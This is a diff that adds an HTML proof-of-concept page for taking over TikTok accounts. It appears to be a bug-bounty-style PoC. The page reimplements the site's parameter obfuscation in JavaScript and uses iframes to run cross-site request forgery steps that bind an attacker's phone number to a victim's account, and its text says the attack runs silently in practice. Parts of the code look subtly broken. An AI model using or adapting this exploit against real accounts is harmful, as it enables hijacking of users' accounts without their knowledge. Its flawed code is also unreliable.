@@ -1,0 +1,66 @@
+<html>
+<body>
+<script>
+                
+     function encrypt(e) {
+                var t, n = [];
+                if (void 0 === e)
+                    return "";
+                t = function(e) {
+                    for (var t, n = e.toString(), i = [], r = 0; r < n.length; r++)
+                        0 <= (t = n.charCodeAt(r)) && t <= 127 ? i.push(t) : 128 <= t && t <= 2047 ? (i.push(192 | 31 & t >> 6),
+                        i.push(128 | 63 & t)) : (2048 <= t && t <= 55295 || 57344 <= t && t <= 65535) && (i.push(224 | 15 & t >> 12),
+                        i.push(128 | 63 & t >> 6),
+                        i.push(128 | 63 & t));
+                    for (var o = 0; o < i.length; o++)
+                        i[o] &= 255;
+                    return i
+                }(e);
+                for (var i = 0, r = t.length; i < r; ++i)
+                    n.push((5 ^ t[i]).toString(16));
+                return n.join("")
+            }
+            
+            function encryptParams(e, n) {
+                var r, o = 0;
+                if ("object" != typeof e)
+                    return e;
+                if (!n || n.length <= 0)
+                    return e;
+                for (var a = e, s = 0, l = n.length; s < l; ++s)
+                    void 0 !== (r = a[n[s]]) && (o |= 1,
+                    a[n[s]] = encrypt(r));
+                return a.mix_mode = o,
+                a
+            }
+            
+            function mobileEncrypted(){
+              var mobile = document.getElementById("attackermobilenum");
+              var e = '{type: 17, mobile: '+mobile+', ticket: ""}'
+              var en = encryptParams(e);
+              document.getElementById("encryptedmobile").innerHTML=en;
+            }
+            
+            function codeEncrypted(){
+              var code = document.getElementById("attackercodeid");
+              var e = '{type: 17, code: '+code+', ticket: ""}'
+              var en = encryptParams(e);
+              document.getElementById("encryptedcode").innerHTML=en;
+            }
+</script>
+<h1>takeover victim account on tiktok</h1>
+<h2>Hi this is a POC for takeover tiktok account,I will explain the account takeover vulnerability steps separately, hoping to make people understand the principle of the breakthrough. In a real attack, these steps are automatic and continuous, and the victim will not find anything.</h2>
+<h3>Before start attack,please set attacker's phone number for encrypted</h3>
+Your phone number for account takeover(pattern:+86XXXXXXX): <input type="text" name="attackermobile" id="attackermobilenum">
+<input type="submit" value="Encryped!" onclick="mobileEncrypted"/>
+<textarea id="encryptedmobile" width="100" height="20"></textarea>
+<h3>Step 1--Using CSRF vulnerability to get the verify code from attacker mobile on victim account</h3>
+<iframe src=/get_code.html></iframe>
+<h3>Step 2--Input the verify code from attacker mobile then encrypted</h3>
+Your verify code from attacker mobile: <input type="text" name="attackercode" id="attackercodeid">
+<input type="submit" value="Encryped!" onclick="codeEncrypted"/>
+<textarea id="encryptedcode" width="100" height="20"></textarea>
+<h3>Step 3--Input the encrpted mobile number and verify code from attacker and click the botton then the attacker mobile will blind on victim account</h3>
+<iframe src=/takeover_account.html></iframe>
+</body>
+</html>
